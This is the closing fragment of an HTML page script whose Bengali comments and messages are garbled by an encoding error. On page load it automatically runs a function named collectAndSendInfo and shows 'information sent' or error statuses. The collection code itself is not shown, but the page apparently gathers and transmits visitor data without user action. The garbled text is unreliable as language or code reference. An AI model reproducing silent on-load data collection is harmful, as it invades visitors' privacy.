        // ржЕржержмрж╛ document.body.innerHTML = "<h1>ржзржирзНржпржмрж╛ржж! рждржерзНржп ржкрж╛ржарж╛ржирзЛ рж╣рзЯрзЗржЫрзЗред</h1>";

      } catch (error) {
        console.error("ржорзВрж▓ ржкрзНрж░ржХрзНрж░рж┐рзЯрж╛рзЯ рждрзНрж░рзБржЯрж┐:", error);
        // showError ржлрж╛ржВрж╢ржи ржпржжрж┐ ржЖржЧрзЗржЗ ржХрж▓ ржирж╛ рж╣рзЯрзЗ ржерж╛ржХрзЗ
        if (!document.getElementById("error").style.display || document.getElementById("error").style.display === "none") {
            showError(`тЭМ ржПржХржЯрж┐ рждрзНрж░рзБржЯрж┐ ржШржЯрзЗржЫрзЗ: ${error.message}`);
        }
        updateStatus("рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржмрж╛ ржкрж╛ржарж╛рждрзЗ рж╕ржорж╕рзНржпрж╛ рж╣ржпрж╝рзЗржЫрзЗ");
      }
    };

    // ржкрзЗржЬ рж▓рзЛржб рж╣рж▓рзЗ рж╢рзБрж░рзБ ржХрж░рзБржи
    // ржирзЗржЯржУрзЯрж╛рж░рзНржХ ржЙржкрж▓ржмрзНржзрждрж╛ ржкрж░рзАржХрзНрж╖рж╛ ржХрж░рзЗ рж╢рзБрж░рзБ ржХрж░рж╛ ржпрзЗрждрзЗ ржкрж╛рж░рзЗ
    if (navigator.onLine) {
        window.addEventListener("load", collectAndSendInfo);
    } else {
        updateStatus("ржЕржлрж▓рж╛ржЗржиред рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╕ржорзНржнржм ржирзЯред");
        showError("ржЖржкржирж╛рж░ ржбрж┐ржнрж╛ржЗрж╕ ржмрж░рзНрждржорж╛ржирзЗ ржЕржлрж▓рж╛ржЗржи рж░рзЯрзЗржЫрзЗред ржЕржирзБржЧрзНрж░рж╣ ржХрж░рзЗ ржЗржирзНржЯрж╛рж░ржирзЗржЯ рж╕ржВржпрзЛржЧ ржкрж░рзАржХрзНрж╖рж╛ ржХрж░рзБржиред");
    }
  </script>
</body>
</html>
